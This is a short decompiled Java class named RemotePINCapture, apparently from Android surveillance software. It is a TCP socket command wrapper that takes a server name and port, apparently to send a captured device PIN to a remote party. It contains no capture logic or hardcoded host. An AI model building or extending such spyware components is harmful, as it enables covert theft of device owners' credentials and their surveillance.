package com.vvt.capture.core.password.ref.command;

import com.fx.socket.TcpSocketCmd;

public class RemotePINCapture
  extends TcpSocketCmd
{
  private static String a;
  private static int b = 0;
  private static final long serialVersionUID = -8688032158908991634L;
  
  public RemotePINCapture(String paramString1, String paramString2, int paramInt)
  {
    super(paramString1, Boolean.class);
    a = paramString2;
    b = paramInt;
  }
  
  protected int getPort()
  {
    return b;
  }
  
  protected String getServerName()
  {
    return a;
  }
  
  protected String getTag()
  {
    return "RemotePINCapture";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/core/password/ref/command/RemotePINCapture.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */